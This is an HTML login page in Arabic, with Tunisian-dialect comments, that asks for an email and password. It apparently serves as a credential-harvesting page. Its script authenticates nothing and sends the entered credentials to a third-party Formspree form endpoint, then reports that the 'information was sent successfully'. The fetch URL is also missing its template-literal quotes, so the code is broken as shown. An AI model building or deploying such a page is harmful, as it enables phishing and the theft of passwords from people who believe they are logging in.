<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 320px;
        }
        .login-card h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status-message {
            margin-top: 15px;
            text-align: center;
            font-weight: bold;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>تسجيل الدخول</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">البريد الإلكتروني:</label>
                <input type="email" id="email" name="email" placeholder="أدخل البريد الإلكتروني" required>
            </div>
            
            <div class="form-group">
                <label for="password">كلمة المرور:</label>
                <!-- رجعنا type="password" باش الحروف تظهر في شكل نجوم -->
                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>

            <button type="submit" id="submitBtn">إرسال</button>
            <div id="status-message"></div>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const statusMsg = document.getElementById('status-message');

        // حط الـ Form ID متاعك هنا (مثال: "xqyvbzpd")
        const formID = "YOUR_FORM_ID_HERE"; 

        form.addEventListener('submit', async function(event) {
            event.preventDefault(); // يمنع فتح صفحات أخرى
            
            btn.disabled = true;
            btn.textContent = 'جاري الإرسال...';
            statusMsg.textContent = '';

            const formData = new FormData(form);

            try {
                const response = await fetch(https://formspree.io/f/${formID}, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    statusMsg.style.color = 'green';
                    statusMsg.textContent = 'تم إرسال المعلومات بنجاح!';
                    form.reset();
                } else {
                    statusMsg.style.color = 'red';
                    statusMsg.textContent = 'حدث خطأ، لم يتم الإرسال!';
                }
            } catch (error) {
                statusMsg.style.color = 'red';
                statusMsg.textContent = 'حدث خطأ في الاتصال بالإنترنت!';
            } finally {
                btn.disabled = false;
                btn.textContent = 'إرسال';
            }
        });
    </script>

</body>
</html>
